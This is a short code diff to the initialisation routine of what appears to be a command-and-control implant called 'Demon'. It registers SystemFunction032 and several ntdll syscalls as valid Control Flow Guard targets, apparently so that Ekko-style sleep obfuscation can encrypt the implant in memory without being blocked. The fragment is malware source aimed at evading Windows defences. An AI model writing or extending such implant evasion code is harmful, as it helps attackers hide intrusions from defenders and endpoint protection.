@@ -846,9 +846,10 @@ VOID DemonInit( VOID )
         PUTS( "Adding required function module &addresses to the cfg list"  );
 
         /* common functions */
-        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtContinue );
-        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtSetContextThread );
-        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtGetContextThread );
+        CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Syscall.NtContinue );
+        CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Syscall.NtSetContextThread );
+        CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Syscall.NtGetContextThread );
+        CfgAddressAdd( Instance.Modules.Advapi32, Instance.Win32.SystemFunction032 );
 
         /* ekko sleep obf */
         CfgAddressAdd( Instance.Modules.Kernel32, Instance.Win32.WaitForSingleObjectEx );
